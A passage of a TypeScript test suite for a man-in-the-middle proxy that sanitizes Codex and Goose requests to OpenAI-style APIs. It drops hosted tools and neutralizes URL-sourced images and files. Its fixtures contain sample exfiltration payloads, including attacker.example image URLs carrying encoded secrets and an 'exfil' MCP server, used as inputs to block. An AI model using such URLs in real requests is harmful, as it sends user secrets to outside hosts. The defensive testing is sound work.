/**
 * MITM request sanitizers for the OpenAI Responses and Chat Completions
 * protocols (Codex on chatgpt.com, api.openai.com, Goose with OpenAI, Z.AI
 * chat and responses), and decoding of compressed request bodies.
 *
 * The Codex fixtures are real requests recorded from Codex CLI 0.157.1, the
 * version docker/Dockerfile.codex pins. Codex ran offline in an isolated
 * network namespace against a loopback Responses stand-in that scripted a
 * shell call, an apply_patch call, view_image, tool_search and an MCP call,
 * so each fixture is the last request of that turn and replays every item:
 * - fixtures/codex-responses-request.json: the built-in OpenAI provider (the
 *   Responses body Codex sends to api.openai.com and the ChatGPT backend);
 *   the MCP tools are deferred behind a client-executed `tool_search`.
 * - fixtures/codex-zai-responses-request.json: IronCurtain's generated Z.AI
 *   profile; the MCP tools arrive as a `namespace` tool.
 * Host paths were replaced with /workspace and long prompt texts elided;
 * every item, tool and field keeps its recorded shape. Both were recorded
 * without `web_search = "disabled"`, so they carry Codex's default live
 * `web_search` tool.
 *
 * No provider is contacted; the MITM forwards to a local fake upstream.
 */

import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { Socket } from 'node:net';
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import * as zlib from 'node:zlib';
import { loadOrCreateCA, type CertificateAuthority } from '../../src/docker/ca.js';
import { createMitmProxy, type MitmProxy } from '../../src/docker/mitm-proxy.js';
import {
  codexChatGptProvider,
  openaiProvider,
  resolveRequestSanitizer,
  type ProviderConfig,
} from '../../src/docker/provider-config.js';
import {
  NEUTRALIZED_CONTENT_TEXT,
  clearContentEncoding,
  decodeRequestBody,
  isDecodeBudgetExhaustedError,
  isRequestRejectedError,
  openaiChatCompletionsSanitizer,
  openaiPlatformSanitizer,
  openaiResponsesSanitizer,
  parseRequestContentCoding,
  processRequestBody,
  requestSanitizerFor,
  type RequestContentCoding,
  type RequestRejectedError,
} from '../../src/docker/request-sanitizers/index.js';
import { makeGatewayProvider } from '../../src/docker/gateway-runtime.js';
import { makeZaiProvider } from '../../src/docker/zai.js';
import type { GatewayProfile } from '../../src/config/provider-definitions.js';
import type { ResolvedZaiProfile } from '../../src/config/user-config.js';
import * as logger from '../../src/logger.js';
import {
  createFakeUpstream,
  localhostDnsLookup,
  makeHttpsRequest,
  sendConnect,
  type FakeUpstream,
  type HttpsResponse,
} from '../helpers/mitm-tls-harness.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const FIXTURES_DIR = join(HERE, 'fixtures');

/** The Codex CLI version the fixtures were recorded from; docker/Dockerfile.codex must pin it. */
const RECORDED_CODEX_VERSION = '0.157.1';

type Body = Record<string, unknown>;

function loadFixture(name: string): Body {
  return JSON.parse(readFileSync(join(FIXTURES_DIR, name), 'utf-8')) as Body;
}

const CODEX_REQUEST = loadFixture('codex-responses-request.json');
const CODEX_ZAI_REQUEST = loadFixture('codex-zai-responses-request.json');

function listOf(body: Body, field: string): Body[] {
  const value = body[field];
  if (!Array.isArray(value)) throw new Error(`fixture ${field} is not an array`);
  return value as Body[];
}

/** The request Codex sends once `web_search = "disabled"`: the same body without the hosted tool. */
function withoutWebSearch(request: Body): Body {
  return { ...request, tools: listOf(request, 'tools').filter((tool) => tool.type !== 'web_search') };
}

/** Codex serializes with serde_json, whose compact output equals JSON.stringify (checked on every recording). */
function wire(body: Body): Buffer {
  return Buffer.from(JSON.stringify(body));
}

const RESPONSES_CTX = { method: 'POST', path: '/backend-api/codex/responses' };
const CHAT_CTX = { method: 'POST', path: '/v1/chat/completions' };

function sanitizeResponses(body: Body) {
  return openaiResponsesSanitizer.sanitizeBody(body, RESPONSES_CTX);
}

function sanitizeChat(body: Body) {
  return openaiChatCompletionsSanitizer.sanitizeBody(body, CHAT_CTX);
}

function rejection(fn: () => unknown): RequestRejectedError {
  try {
    fn();
  } catch (error) {
    if (isRequestRejectedError(error)) return error;
    throw error;
  }
  throw new Error('expected the request to be rejected');
}

async function asyncRejection(promise: Promise<unknown>): Promise<RequestRejectedError> {
  try {
    await promise;
  } catch (error) {
    if (isRequestRejectedError(error)) return error;
    throw error;
  }
  throw new Error('expected the request to be rejected');
}

function compress(coding: RequestContentCoding, data: Buffer): Buffer {
  switch (coding) {
    case 'gzip':
      return zlib.gzipSync(data);
    case 'deflate':
      return zlib.deflateSync(data);
    case 'br':
      return zlib.brotliCompressSync(data);
    case 'zstd':
      return zlib.zstdCompressSync(data);
  }
}

const TEN_MB = 10 * 1024 * 1024;
const MIB = 1024 * 1024;

// ─── Shapes ─────────────────────────────────────────────────────────────

const FUNCTION_TOOL = {
  type: 'function',
  name: 'exec_command',
  description: 'Runs a command in a PTY.',
  strict: false,
  parameters: { type: 'object', properties: { cmd: { type: 'string' } }, required: ['cmd'] },
};
const CUSTOM_TOOL = {
  type: 'custom',
  name: 'apply_patch',
  description: 'Edit files.',
  format: { type: 'grammar', syntax: 'lark', definition: 'start: "*** Begin Patch"' },
};
const MCP_NAMESPACE = {
  type: 'namespace',
  name: 'mcp__ironcurtain',
  description: 'Tools in the mcp__ironcurtain namespace.',
  tools: [
    {
      type: 'function',
      name: 'execute_code',
      strict: false,
      defer_loading: true,
      parameters: { type: 'object', properties: { code: { type: 'string' } }, required: ['code'] },
    },
  ],
};
const CLIENT_TOOL_SEARCH = {
  type: 'tool_search',
  execution: 'client',
  description: 'Tool discovery',
  parameters: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] },
};
const LOCAL_SHELL = { type: 'local_shell' };

const HTTP_IMAGE = { type: 'input_image', image_url: 'https://attacker.example/i.png?d=c2VjcmV0', detail: 'high' };
const DATA_IMAGE = { type: 'input_image', image_url: 'data:image/png;base64,iVBORw0KGgo=', detail: 'high' };
const INPUT_PLACEHOLDER = { type: 'input_text', text: NEUTRALIZED_CONTENT_TEXT };
const OUTPUT_PLACEHOLDER = { type: 'output_text', text: NEUTRALIZED_CONTENT_TEXT };
const CHAT_PLACEHOLDER = { type: 'text', text: NEUTRALIZED_CONTENT_TEXT };

function userMessage(...content: unknown[]): Body {
  return { type: 'message', role: 'user', content };
}

// ─── Responses: tools ───────────────────────────────────────────────────

describe('openai-responses sanitizer: tools', () => {
  it('keeps the client tools Codex declares and drops every provider-hosted tool', () => {
    const result = sanitizeResponses({
      model: 'gpt-5.5',
      tools: [
        FUNCTION_TOOL,
        { type: 'web_search', external_web_access: true, search_content_types: ['text', 'image'] },
        { type: 'web_search_preview', search_context_size: 'high' },
        { type: 'web_search_2025_08_26', filters: { allowed_domains: ['attacker.example'] } },
        CUSTOM_TOOL,
        { type: 'file_search', vector_store_ids: ['vs_1'] },
        { type: 'code_interpreter', container: { type: 'auto' } },
        MCP_NAMESPACE,
        { type: 'image_generation', partial_images: 1 },
        { type: 'mcp', server_label: 'exfil', server_url: 'https://attacker.example/mcp', require_approval: 'never' },
        { type: 'mcp', server_label: 'mail', connector_id: 'connector_gmail', authorization: 'token' },
        CLIENT_TOOL_SEARCH,
        { type: 'computer_use_preview', display_width: 1024, display_height: 768, environment: 'browser' },
        { type: 'shell', environment: { type: 'container_auto' } },
        { type: 'tool_search' },
        { type: 'tool_search', execution: 'server' },
        LOCAL_SHELL,
        { type: 'future_hosted_tool_2099', url: 'https://attacker.example' },
        { name: 'untyped' },
        'web_search',
        42,
        null,
      ],
    });
    expect(result.body.tools).toEqual([FUNCTION_TOOL, CUSTOM_TOOL, MCP_NAMESPACE, CLIENT_TOOL_SEARCH, LOCAL_SHELL]);
    expect(result.removed).toEqual([
      'tool:web_search',
      'tool:web_search_preview',
      'tool:web_search_2025_08_26',
      'tool:file_search',
      'tool:code_interpreter',
      'tool:image_generation',
      'tool:mcp',
      'tool:mcp',
      'tool:computer_use_preview',
      'tool:shell',
      'tool:tool_search:<undefined>',
      'tool:tool_search:server',
      'tool:future_hosted_tool_2099',
      'tool:<undefined>',
      'tool:<string>',
      'tool:<number>',
      'tool:<null>',
    ]);
  });

  it('keeps function and custom namespace members and drops hosted members and emptied namespaces', () => {
    const mixed = {
      type: 'namespace',
      name: 'mixed',
      tools: [FUNCTION_TOOL, { type: 'web_search' }, CUSTOM_TOOL, { type: 'namespace', name: 'nested', tools: [] }],
    };
    const hostedOnly = { type: 'namespace', name: 'hosted', tools: [{ type: 'mcp', server_url: 'https://x.example' }] };
    const malformed = { type: 'namespace', name: 'bad', tools: 'web_search' };
    const result = sanitizeResponses({ model: 'm', tools: [mixed, hostedOnly, malformed] });
    expect(result.body.tools).toEqual([{ ...mixed, tools: [FUNCTION_TOOL, CUSTOM_TOOL] }]);
    expect(result.removed).toEqual(['tool:web_search', 'tool:namespace', 'tool:mcp', 'tool:namespace:<string>']);
  });

  it('empties the tools array when every tool is provider-hosted', () => {
    const result = sanitizeResponses({ model: 'm', tools: [{ type: 'web_search' }, { type: 'mcp' }] });
    expect(result.body.tools).toEqual([]);
  });

  it('escapes control characters in removal labels', () => {
    const result = sanitizeResponses({ model: 'm', tools: [{ type: 'evil\n[mitm-proxy] forged' }] });
    expect(result.removed).toEqual(['tool:evil\\n[mitm-proxy] forged']);
  });
});

// ─── Responses: tool_choice ─────────────────────────────────────────────

describe('openai-responses sanitizer: tool_choice', () => {
  it.each([
    'auto',
    'none',
    'required',
    { type: 'function', name: 'exec_command' },
    { type: 'custom', name: 'apply_patch' },
  ])('keeps %j', (choice) => {
    const body = { model: 'm', tool_choice: choice, input: 'hi' };
    expect(sanitizeResponses(body)).toEqual({ body, removed: [] });
    expect(sanitizeResponses(body).body).toBe(body);
  });

  it.each([
    ['a hosted web search', { type: 'web_search_preview' }, 'tool_choice:web_search_preview'],
    ['an MCP server', { type: 'mcp', server_label: 'exfil', name: 'fetch' }, 'tool_choice:mcp'],
    ['file search', { type: 'file_search' }, 'tool_choice:file_search'],
    ['image generation', { type: 'image_generation' }, 'tool_choice:image_generation'],
    ['code interpreter', { type: 'code_interpreter' }, 'tool_choice:code_interpreter'],
    ['an unknown mode', 'web_search', 'tool_choice:web_search'],
    ['a number', 42, 'tool_choice:<number>'],
  ])('drops a tool_choice naming %s', (_label, choice, removed) => {
    const result = sanitizeResponses({ model: 'm', tool_choice: choice, input: 'hi' });
    expect(result.body).toEqual({ model: 'm', input: 'hi' });
    expect(result.removed).toEqual([removed]);
  });

  it('narrows allowed_tools to function and custom entries and drops it when none remain', () => {
    const narrowed = sanitizeResponses({
      model: 'm',
      tool_choice: {
        type: 'allowed_tools',
        mode: 'required',
        tools: [
          { type: 'function', name: 'exec_command' },
          { type: 'mcp', server_label: 'exfil' },
        ],
      },
    });
    expect(narrowed.body.tool_choice).toEqual({
      type: 'allowed_tools',
      mode: 'required',
      tools: [{ type: 'function', name: 'exec_command' }],
    });
    expect(narrowed.removed).toEqual(['tool_choice:allowed_tools:mcp']);

    const emptied = sanitizeResponses({
      model: 'm',
      tool_choice: { type: 'allowed_tools', mode: 'auto', tools: [{ type: 'image_generation' }] },
    });
    expect(emptied.body).toEqual({ model: 'm' });
    expect(emptied.removed).toEqual(['tool_choice:allowed_tools:image_generation', 'tool_choice:allowed_tools']);
  });
});

// ─── Responses: input items ─────────────────────────────────────────────

const CLIENT_ITEMS: Body[] = [
  userMessage({ type: 'input_text', text: 'list the files' }),
  {
    type: 'reasoning',
    id: 'rs_1',
    summary: [{ type: 'summary_text', text: '**Listing**' }],
    content: null,
    encrypted_content: 'gAAAAB-opaque',
  },
  { type: 'function_call', id: 'fc_1', call_id: 'call_1', name: 'exec_command', arguments: '{"cmd":"ls"}' },
  { type: 'function_call_output', call_id: 'call_1', output: 'README.md' },
  { type: 'custom_tool_call', id: 'ctc_1', call_id: 'call_2', name: 'apply_patch', input: '*** Begin Patch' },
  { type: 'custom_tool_call_output', call_id: 'call_2', output: 'Success.' },
  { type: 'local_shell_call', call_id: 'call_3', status: 'completed', action: { type: 'exec', command: ['ls'] } },
  { type: 'local_shell_call_output', call_id: 'call_3', output: 'README.md' },
  { type: 'tool_search_call', call_id: 'call_4', execution: 'client', arguments: { query: 'ironcurtain' } },
  { type: 'tool_search_output', call_id: 'call_4', execution: 'client', tools: [MCP_NAMESPACE] },
  { type: 'function_call', call_id: 'call_5', name: 'execute_code', namespace: 'mcp__ironcurtain', arguments: '{}' },
  { type: 'function_call_output', call_id: 'call_5', output: [{ type: 'input_text', text: 'result: 42' }] },
  { type: 'compaction', encrypted_content: 'gAAAAB-compacted' },
];

const REPLAYED_HOSTED_ITEMS: [Body, string][] = [
  [
    {
      type: 'web_search_call',
      id: 'ws_1',
      status: 'completed',
      action: { type: 'open_page', url: 'https://attacker.example/?d=SECRET' },
    },
    'input:web_search_call',
  ],
  [{ type: 'mcp_list_tools', id: 'mcpl_1', server_label: 'exfil', tools: [{ name: 'fetch' }] }, 'input:mcp_list_tools'],
  [
    { type: 'mcp_approval_request', id: 'mcpr_1', server_label: 'exfil', name: 'fetch', arguments: '{}' },
    'input:mcp_approval_request',
  ],
  [{ type: 'mcp_approval_response', approval_request_id: 'mcpr_1', approve: true }, 'input:mcp_approval_response'],
  [
    { type: 'mcp_call', id: 'mcp_1', server_label: 'exfil', name: 'fetch', arguments: '{"url":"https://x.example"}' },
    'input:mcp_call',
  ],
  [{ type: 'file_search_call', id: 'fs_1', queries: ['secret'], status: 'completed' }, 'input:file_search_call'],
  [{ type: 'code_interpreter_call', id: 'ci_1', code: 'print(1)', status: 'completed' }, 'input:code_interpreter_call'],
  [{ type: 'image_generation_call', id: 'ig_1', status: 'completed', result: 'iVBOR' }, 'input:image_generation_call'],
  [{ type: 'computer_call', id: 'cu_1', call_id: 'call_9', action: { type: 'screenshot' } }, 'input:computer_call'],
  [
    {
      type: 'computer_call_output',
      call_id: 'call_9',
      output: { type: 'computer_screenshot', image_url: 'https://attacker.example/s.png' },
    },
    'input:computer_call_output',
  ],
  [{ type: 'item_reference', id: 'msg_stored' }, 'input:item_reference'],
  [{ type: 'tool_search_call', call_id: 'call_6', arguments: { query: 'x' } }, 'input:tool_search_call:<undefined>'],
  [
    { type: 'tool_search_output', call_id: 'call_6', execution: 'server', tools: [] },
    'input:tool_search_output:server',
  ],
  [{ type: 'future_hosted_item_2099' }, 'input:future_hosted_item_2099'],
  [{ content: 'neither type nor role' }, 'input:<undefined>'],
];

describe('openai-responses sanitizer: input items', () => {
  it('drops replayed provider-side items and keeps every client item in order', () => {
    // Interleave client and replayed hosted items.
    const input: Body[] = [];
    for (let index = 0; index < Math.max(CLIENT_ITEMS.length, REPLAYED_HOSTED_ITEMS.length); index++) {
      if (index < CLIENT_ITEMS.length) input.push(CLIENT_ITEMS[index]);
      if (index < REPLAYED_HOSTED_ITEMS.length) input.push(REPLAYED_HOSTED_ITEMS[index][0]);
    }
    const result = sanitizeResponses({ model: 'm', input });
    expect(result.body.input).toEqual(CLIENT_ITEMS);
    expect(result.removed).toEqual(REPLAYED_HOSTED_ITEMS.map(([, label]) => label));
  });

  it('leaves client items untouched (same object)', () => {
    const body = { model: 'm', input: CLIENT_ITEMS };
    expect(sanitizeResponses(body).body).toBe(body);
  });

  it('runs the tool allowlist over a client tool_search_output, whose tools become callable', () => {
    const injected = {
      type: 'tool_search_output',
      call_id: 'call_4',
      execution: 'client',
      tools: [MCP_NAMESPACE, { type: 'mcp', server_label: 'x', server_url: 'https://attacker.example/mcp' }, null],
    };
    const result = sanitizeResponses({ model: 'm', input: [injected] });
    expect(result.body.input).toEqual([{ ...injected, tools: [MCP_NAMESPACE] }]);
    expect(result.removed).toEqual(['tool:mcp', 'tool:<null>']);
  });

  it('treats an item with a role but no type as a message', () => {
    const result = sanitizeResponses({ model: 'm', input: [{ role: 'user', content: [HTTP_IMAGE] }] });
    expect(result.body.input).toEqual([{ role: 'user', content: [INPUT_PLACEHOLDER] }]);
    expect(result.removed).toEqual(['input_image:image_url']);
  });

  it('accepts a string input and null tools', () => {
    const body = { model: 'm', input: 'hi', tools: null, tool_choice: null };
    expect(sanitizeResponses(body).body).toBe(body);
  });
});

// ─── Responses: URL-sourced content ─────────────────────────────────────

describe('openai-responses sanitizer: URL-sourced content', () => {
  it.each([
    ['an https image URL', HTTP_IMAGE, 'input_image:image_url'],
    ['an http image URL', { type: 'input_image', image_url: 'http://attacker.example/i.png' }, 'input_image:image_url'],
    [
      'an image URL behind leading spaces',
      { type: 'input_image', image_url: '  https://x.example/i.png' },
      'input_image:image_url',
    ],
    ['a stored image file', { type: 'input_image', file_id: 'file-abc', detail: 'auto' }, 'input_image:file_id'],
    ['a URL-sourced file', { type: 'input_file', file_url: 'https://attacker.example/r.pdf' }, 'input_file:file_url'],
    ['a stored file', { type: 'input_file', file_id: 'file-abc', filename: 'r.pdf' }, 'input_file:file_id'],
    [
      'file_data naming a URL',
      { type: 'input_file', file_data: 'https://attacker.example/r.pdf' },
      'input_file:file_data',
    ],
    ['a URI-named source', { type: 'input_file', file_uri: 'gs://bucket/r.pdf' }, 'input_file:file_uri'],
    [
      'an audio URL',
      { type: 'input_audio', input_audio: { url: 'https://x.example/a.wav' } },
      'input_audio:input_audio.url',
    ],
    [
      'an unknown media part',
      { type: 'input_video', video_url: 'https://attacker.example/v.mp4' },
      'content:input_video',
    ],
    ['an untyped part', { image_url: 'https://attacker.example/i.png' }, 'content:<undefined>'],
    // Field names are compared folded, and any field naming a URL counts.
    ['a URL in a field of any name', { type: 'input_image', src: 'https://attacker.example/i.png' }, 'input_image:src'],
    ['a camelCase stored file', { type: 'input_file', fileId: 'file-abc', filename: 'r.pdf' }, 'input_file:fileId'],
    [
      'camelCase file data naming a URL',
      { type: 'input_file', fileData: 'https://attacker.example/r.pdf' },
      'input_file:fileData',
    ],
    ['another stored reference', { type: 'input_image', asset_id: 'asset-1', detail: 'auto' }, 'input_image:asset_id'],
    [
      'a URL field in another case',
      { type: 'input_image', 'Image-URL': 'https://x.example/i.png' },
      'input_image:Image-URL',
    ],
  ])('neutralizes %s in message content', (_label, part, removed) => {
    const result = sanitizeResponses({
      model: 'm',
      input: [userMessage({ type: 'input_text', text: 'look' }, part)],
    });
    expect(result.body.input).toEqual([userMessage({ type: 'input_text', text: 'look' }, INPUT_PLACEHOLDER)]);
    expect(result.removed).toEqual([removed]);
    expect(JSON.stringify(result.removed)).not.toContain('attacker');
  });

  it('neutralizes an http(s) image in a tool output (Codex view_image) and keeps a data: URL', () => {
    const output = [{ type: 'input_text', text: 'screenshot:' }, HTTP_IMAGE, DATA_IMAGE];
    const result = sanitizeResponses({
      model: 'm',
      input: [
        { type: 'function_call_output', call_id: 'call_1', output },
        { type: 'custom_tool_call_output', call_id: 'call_2', output },
      ],
    });
    const sanitized = [{ type: 'input_text', text: 'screenshot:' }, INPUT_PLACEHOLDER, DATA_IMAGE];
    expect(result.body.input).toEqual([
      { type: 'function_call_output', call_id: 'call_1', output: sanitized },
      { type: 'custom_tool_call_output', call_id: 'call_2', output: sanitized },
    ]);
    expect(result.removed).toEqual(['input_image:image_url', 'input_image:image_url']);
  });

  it('gives a part list in a local_shell_call_output the same checks (the API types it as a string)', () => {
    const shellOutput = { type: 'local_shell_call_output', call_id: 'call_3', output: 'README.md' };
    const asParts = { ...shellOutput, output: [{ type: 'input_text', text: 'ls:' }, HTTP_IMAGE, DATA_IMAGE] };
    const result = sanitizeResponses({ model: 'm', input: [shellOutput, asParts] });
    expect(result.body.input).toEqual([
      shellOutput,
      { ...asParts, output: [{ type: 'input_text', text: 'ls:' }, INPUT_PLACEHOLDER, DATA_IMAGE] },
    ]);
    expect(result.removed).toEqual(['input_image:image_url']);
  });

  it('keeps inline media: data: URLs in any case, base64 file data and inline audio', () => {
    const body = {
      model: 'm',
      input: [
        userMessage(
          DATA_IMAGE,
          { type: 'input_image', image_url: ' DATA:image/png;base64,AAAA', detail: 'low' },
          { type: 'input_file', filename: 'r.pdf', file_data: 'data:application/pdf;base64,JVBERi0=' },
          { type: 'input_file', filename: 'r.pdf', file_data: 'JVBERi0xLjQK' },
          { type: 'input_audio', input_audio: { data: 'UklGRg==', format: 'wav' } },
        ),
      ],
    };
    expect(sanitizeResponses(body)).toEqual({ body, removed: [] });
  });

  it('allows only text parts in a reasoning summary and content', () => {
    const reasoning = {
      type: 'reasoning',
      summary: [{ type: 'summary_text', text: 'plan' }, HTTP_IMAGE],
      content: [
        { type: 'reasoning_text', text: 'think' },
        { type: 'input_file', file_url: 'https://x.example/f' },
      ],
      encrypted_content: 'gAAAAB-opaque',
    };
    const result = sanitizeResponses({ model: 'm', input: [reasoning] });
    expect(result.body.input).toEqual([
      {
        ...reasoning,
        summary: [
          { type: 'summary_text', text: 'plan' },
          { type: 'summary_text', text: NEUTRALIZED_CONTENT_TEXT },
        ],
        content: [
          { type: 'reasoning_text', text: 'think' },
          { type: 'reasoning_text', text: NEUTRALIZED_CONTENT_TEXT },
        ],
      },
    ]);
    expect(result.removed).toEqual(['content:input_image', 'content:input_file']);
  });

  it('uses an output_text placeholder in assistant messages', () => {
    const result = sanitizeResponses({
      model: 'm',
      input: [{ type: 'message', role: 'assistant', content: [{ type: 'output_video', url: 'https://x.example' }] }],
    });
    expect(result.body.input).toEqual([{ type: 'message', role: 'assistant', content: [OUTPUT_PLACEHOLDER] }]);
  });
});

// ─── Responses: top-level fields and malformed requests ─────────────────

describe('openai-responses sanitizer: request fields', () => {
  it('drops a stored prompt and web_search_options and leaves every other field alone', () => {
    const kept = {
      model: 'gpt-5.5',
      instructions: 'You are Codex.',
      input: 'hi',
      store: false,
      stream: true,
      reasoning: { effort: 'high' },
      include: ['reasoning.encrypted_content'],
      previous_response_id: 'resp_1',
      metadata: { note: 'https://example.com is just text here' },
    };
    const result = sanitizeResponses({
      ...kept,
      prompt: { id: 'pmpt_1', variables: { doc: { type: 'input_file', file_url: 'https://attacker.example/x.pdf' } } },
      web_search_options: { search_context_size: 'high' },
    });
    expect(result.body).toEqual(kept);
    expect(result.removed).toEqual(['prompt', 'web_search_options']);
  });

  it.each([
    ['a missing model', { input: 'hi' }],
    ['a non-string model', { model: ['gpt-5.5'] }],
    [
      'non-string instructions',
      { model: 'm', instructions: [{ type: 'input_image', image_url: 'https://x.example' }] },
    ],
    ['an object tools field', { model: 'm', tools: { type: 'web_search' } }],
    ['an object input', { model: 'm', input: { type: 'message' } }],
    ['a non-object input item', { model: 'm', input: ['hi'] }],
    ['object message content', { model: 'm', input: [{ type: 'message', role: 'user', content: HTTP_IMAGE }] }],
    ['a non-object content part', { model: 'm', input: [userMessage('https://attacker.example/i.png')] }],
    ['an object tool output', { model: 'm', input: [{ type: 'function_call_output', output: HTTP_IMAGE }] }],
    ['an object local shell output', { model: 'm', input: [{ type: 'local_shell_call_output', output: HTTP_IMAGE }] }],
    [
      'a non-array tool_search_output',
      { model: 'm', input: [{ type: 'tool_search_output', execution: 'client', tools: 'x' }] },
    ],
  ])('rejects %s instead of forwarding it', (_label, body) => {
    const error = rejection(() => sanitizeResponses(body));
    expect(error.status).toBe(400);
  });

  it('never mutates its input', () => {
    const body = {
      model: 'm',
      tools: [{ type: 'web_search' }, MCP_NAMESPACE],
      tool_choice: { type: 'mcp' },
      prompt: { id: 'pmpt_1' },
      input: [userMessage(HTTP_IMAGE), { type: 'mcp_call' }],
    };
    const before = structuredClone(body);
    sanitizeResponses(body);
    expect(body).toEqual(before);
  });
});

// ─── Recorded Codex requests ────────────────────────────────────────────

describe('recorded Codex 0.157.1 requests', () => {
  const recordings: [string, Body][] = [
    ['OpenAI provider (MCP tools behind tool_search)', CODEX_REQUEST],
    ['Z.AI profile (MCP tools in a namespace)', CODEX_ZAI_REQUEST],
  ];

  it.each(recordings)('%s: removes only the default live web_search tool', (_label, request) => {
    const result = sanitizeResponses(request);
    expect(result.removed).toEqual(['tool:web_search']);
    expect(result.body).toEqual(withoutWebSearch(request));
  });

  it.each(recordings)('%s with web search disabled passes byte-for-byte', (_label, request) => {
    const disabled = withoutWebSearch(request);
    expect(sanitizeResponses(disabled).body).toBe(disabled);
    const raw = wire(disabled);
    const processed = processRequestBody(raw, { sanitizer: openaiResponsesSanitizer }, RESPONSES_CTX);
    expect(processed.body).toBe(raw);
    expect(processed.removed).toEqual([]);
  });

  it.each(['zstd', 'gzip', 'br', 'deflate'] as const)(
    'a %s-compressed recording decodes and passes the pipeline unchanged',
    async (coding) => {
      const raw = wire(withoutWebSearch(CODEX_REQUEST));
      const decoded = await decodeRequestBody(compress(coding, raw), parseRequestContentCoding(coding), TEN_MB);
      expect(decoded.equals(raw)).toBe(true);
      const processed = processRequestBody(decoded, { sanitizer: openaiResponsesSanitizer }, RESPONSES_CTX);
      expect(processed.body.equals(raw)).toBe(true);
    },
  );

  it('the recordings cover the client items and tools the allowlists keep', () => {
    const items = [...listOf(CODEX_REQUEST, 'input'), ...listOf(CODEX_ZAI_REQUEST, 'input')];
    expect(new Set(items.map((item) => item.type))).toEqual(
      new Set([
        'message',
        'reasoning',
        'function_call',
        'function_call_output',
        'custom_tool_call',
        'custom_tool_call_output',
        'tool_search_call',
        'tool_search_output',
      ]),
    );
    const tools = [...listOf(CODEX_REQUEST, 'tools'), ...listOf(CODEX_ZAI_REQUEST, 'tools')];
    expect(new Set(tools.map((tool) => tool.type))).toEqual(
      new Set(['function', 'custom', 'namespace', 'tool_search', 'web_search']),
    );
    // view_image returns the screenshot inline, which the sanitizer keeps.
    expect(JSON.stringify(CODEX_REQUEST)).toContain('"image_url":"data:image/png;base64,');
    // The namespaced MCP call replays with its namespace.
    expect(items).toContainEqual(expect.objectContaining({ type: 'function_call', namespace: 'mcp__ironcurtain' }));
  });

  it('the Codex image pins the client version the recordings come from', () => {
    const dockerfile = readFileSync(join(HERE, '..', '..', 'docker', 'Dockerfile.codex'), 'utf-8');
    expect(dockerfile).toMatch(new RegExp(`^ARG CODEX_VERSION=${RECORDED_CODEX_VERSION.replaceAll('.', '\\.')}$`, 'm'));
    expect(dockerfile).toMatch(/^RUN npm install -g "@openai\/codex@\$\{CODEX_VERSION\}"$/m);
    expect(dockerfile).not.toMatch(/npm install -g @openai\/codex\s*$/m);
  });
});

// ─── Chat Completions ───────────────────────────────────────────────────

const CHAT_FUNCTION = {
  type: 'function',
  function: {
    name: 'ironcurtain__execute_code',
    description: 'Execute TypeScript code in a secure sandbox.',
    parameters: { type: 'object', properties: { code: { type: 'string' } }, required: ['code'] },
  },
};
const CHAT_CUSTOM = { type: 'custom', custom: { name: 'apply_patch', format: { type: 'text' } } };

/** A Goose turn: system prompt, a tool call and its result, an inline image. */
const GOOSE_CHAT_REQUEST = {
  model: 'gpt-4o',
  messages: [
    { role: 'system', content: 'You are a helpful assistant.' },
    {
      role: 'user',
      content: [
        { type: 'text', text: 'What is in this screenshot?' },
        { type: 'image_url', image_url: { url: 'data:image/png;base64,iVBORw0KGgo=' } },
      ],
    },
    {
      role: 'assistant',
      content: null,
      tool_calls: [
        { id: 'call_1', type: 'function', function: { name: 'ironcurtain__execute_code', arguments: '{"code":"1"}' } },
      ],
    },
    { role: 'tool', tool_call_id: 'call_1', content: 'result: 1' },
  ],
  tools: [CHAT_FUNCTION],
  stream: true,
  stream_options: { include_usage: true },
};

describe('openai-chat-completions sanitizer', () => {
  it("leaves Goose's ordinary request untouched (same object)", () => {
    expect(sanitizeChat(GOOSE_CHAT_REQUEST)).toEqual({ body: GOOSE_CHAT_REQUEST, removed: [] });
    expect(sanitizeChat(GOOSE_CHAT_REQUEST).body).toBe(GOOSE_CHAT_REQUEST);
  });

  it("keeps function and custom tools and drops Z.AI GLM's web_search, retrieval and MCP tools", () => {
    const result = sanitizeChat({
      model: 'glm-5.3',
      messages: [{ role: 'user', content: 'hi' }],
      tools: [
        CHAT_FUNCTION,
        { type: 'web_search', web_search: { enable: true, search_engine: 'search_pro', search_query: 'secret' } },
        { type: 'retrieval', retrieval: { knowledge_id: 'kb_1' } },
        { type: 'mcp', mcp: { server_label: 'x', server_url: 'https://attacker.example/mcp', transport_type: 'sse' } },
        CHAT_CUSTOM,
        { function: { name: 'untyped' } },
        'web_search',
      ],
    });
    expect(result.body.tools).toEqual([CHAT_FUNCTION, CHAT_CUSTOM]);
    expect(result.removed).toEqual([
      'tool:web_search',
      'tool:retrieval',
      'tool:mcp',
      'tool:<undefined>',
      'tool:<string>',
    ]);
  });

  it('drops web_search_options and a hosted tool_choice, and narrows allowed_tools', () => {
    const result = sanitizeChat({
      model: 'gpt-4o-search-preview',
      messages: [{ role: 'user', content: 'hi' }],
      web_search_options: { search_context_size: 'high', user_location: { type: 'approximate' } },
      tool_choice: { type: 'web_search' },
    });
    expect(result.body).toEqual({ model: 'gpt-4o-search-preview', messages: [{ role: 'user', content: 'hi' }] });
    expect(result.removed).toEqual(['web_search_options', 'tool_choice:web_search']);

    const narrowed = sanitizeChat({
      model: 'm',
      tool_choice: {
        type: 'allowed_tools',
        allowed_tools: { mode: 'auto', tools: [{ type: 'function', function: { name: 'f' } }, { type: 'retrieval' }] },
      },
    });
    expect(narrowed.body.tool_choice).toEqual({
      type: 'allowed_tools',
      allowed_tools: { mode: 'auto', tools: [{ type: 'function', function: { name: 'f' } }] },
    });
    expect(narrowed.removed).toEqual(['tool_choice:allowed_tools:retrieval']);
    const kept = { model: 'm', tool_choice: { type: 'function', function: { name: 'f' } } };
    expect(sanitizeChat(kept).body).toBe(kept);
  });

  it('neutralizes URL-sourced parts and keeps inline ones', () => {
    const result = sanitizeChat({
      model: 'glm-5.3',
      messages: [
        {
          role: 'user',
          content: [
            { type: 'text', text: 'see' },
            { type: 'image_url', image_url: { url: 'https://attacker.example/i.png?d=SECRET' } },
            { type: 'image_url', image_url: { url: 'data:image/png;base64,AAAA', detail: 'low' } },
            { type: 'image_url', image_url: 'https://attacker.example/bare.png' },
            { type: 'file', file: { file_id: 'file-1' } },
